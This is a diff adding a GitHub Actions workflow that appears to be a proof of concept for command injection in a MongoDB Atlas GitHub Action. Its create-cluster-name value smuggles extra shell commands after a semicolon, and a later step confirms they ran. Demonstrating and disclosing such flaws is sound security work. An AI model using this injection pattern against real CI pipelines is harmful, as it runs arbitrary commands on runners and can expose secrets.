@@ -1,0 +1,35 @@
+name: POC - Command Injection via create-cluster-name
+
+on:
+  workflow_dispatch:
+  push:
+    branches:
+      - main
+
+jobs:
+  exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: POC - Command Injection via create-cluster-name
+        uses: mongodb/atlas-github-action@v0.2.0
+        with:
+          # Command injection via create-cluster-name
+          # The injected command executes even though atlas command will fail
+          create-cluster-name: "test-cluster; echo '🚨 INJECTION via create-cluster-name 🚨' && echo 'User: '$(whoami) && echo 'PWD: '$(pwd) && touch /tmp/cluster-injection-poc.txt"
+          tier: "M0"
+          provider: "AWS"
+          region: "US_EAST_1"
+
+      - name: Verify Injection
+        shell: bash
+        run: |
+          if [ -f /tmp/cluster-injection-poc.txt ]; then
+            echo "✅ VULNERABILITY CONFIRMED: Command injection via create-cluster-name successful!"
+            echo ""
+            echo "The injected commands executed before the atlas command failed."
+          else
+            echo "❌ Injection may have failed"
+          fi
